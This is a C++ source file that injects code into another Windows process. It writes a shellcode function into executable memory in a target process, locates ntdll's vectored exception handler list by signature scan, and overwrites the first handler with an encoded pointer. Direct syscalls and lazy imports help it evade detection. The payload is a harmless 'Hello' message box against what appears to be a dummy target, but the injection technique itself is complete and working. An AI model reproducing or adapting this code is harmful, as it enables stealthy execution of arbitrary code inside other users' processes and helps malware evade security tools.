#include <Windows.h>
#include <iostream>

#include "memory_manager.hpp"
#include "LazyImporter.h"

struct _LdrpVectorHandlerEntry
{
    _LdrpVectorHandlerEntry* flink;
    _LdrpVectorHandlerEntry* blink;
    DWORD64 unknown1;
    DWORD64 unknown2;
    PVECTORED_EXCEPTION_HANDLER exception_handler;
};

struct _LdrpVectorHandlerList
{
    SRWLOCK srw_lock; 
    _LdrpVectorHandlerEntry* first;
    _LdrpVectorHandlerEntry* last;
}; 

__attribute__((naked)) long __stdcall ZwQueryInformationProcess(HANDLE ProcessHandle, long ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength) {
    __asm {
       mov     r10, rcx
       mov     eax, 19h
       syscall
       retn
    }
}

memory_manager mem{};

namespace veh {

   auto obfuscate_pointer(const uintptr_t pointer, const bool deobfuscate) -> uintptr_t {
      uintptr_t cookie = 0;
        if (ZwQueryInformationProcess(mem.target_process, 0x24, &cookie, 4u, nullptr) < 0) {
            return 0;
        }

        return deobfuscate ? cookie ^ _rotr64(pointer, 0x40 - (cookie & 0x3F)) : _rotr64(pointer ^ cookie, cookie & 0x3F);
   }

    auto get_first_handler_list_entry() -> uintptr_t {
        const auto ntdll = mem.get_module(L"ntdll.dll");

        // Signature scan for a place near where the list is used by ntdll
        uintptr_t sig_match = mem.signature_scan(ntdll.base_addr, ntdll.size, "\x48\x89\x53\x20\x48\x8D\x3C\xF7", "xxxxxxxx");
        if (!sig_match) {
            return 0;
        }

        // Offset to instruction using list
        sig_match += 0xD;

        // Calculate the absolute address from the relative instruction operand
        const auto handler_list = (_LdrpVectorHandlerList*)(sig_match + *reinterpret_cast<int32_t*>(sig_match + 0x3) + 7);
        if (!handler_list) {
            return 0;
        }

        // Read first handler entry from list
        return mem.read_memory<uintptr_t >(reinterpret_cast<uintptr_t>(handler_list->first));
    }

    auto override_first_entry_exception_handler(const uintptr_t address) -> bool {
        const auto entry = get_first_handler_list_entry();
        if (!entry) {
            return false;
        }

        return mem.write_memory(entry + 0x20, address);
    }

    auto get_first_entry_exception_handler() -> uintptr_t {
        const auto entry = get_first_handler_list_entry();
        if (!entry) {
            return false;
        }

        return mem.read_memory<uintptr_t>(entry + 0x20);
    }

}

auto shell(_EXCEPTION_POINTERS* pEx) -> long {

   char const msgInline[] = { 'H',  'e',  'l',  'l' ,  'o',  '\0' };
   LI_FN(MessageBoxA)((HWND)0, msgInline, nullptr, 0u);
   
   return EXCEPTION_CONTINUE_SEARCH;
}
auto shell_end() -> void {}

int main() {

    const auto proc_hdl = mem.get_process(L"ExceptionInjectionDummy.exe");

    // Allocate code in target process
    auto remote_page = VirtualAllocEx(proc_hdl, nullptr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(proc_hdl, remote_page, (LPCVOID)shell, (uintptr_t)shell_end - (uintptr_t)shell, nullptr);

    // Override exception handler address
    const auto obfuscated_address = veh::obfuscate_pointer(reinterpret_cast<uintptr_t>(remote_page), false);
    veh::override_first_entry_exception_handler(obfuscated_address);

    return 0;
}
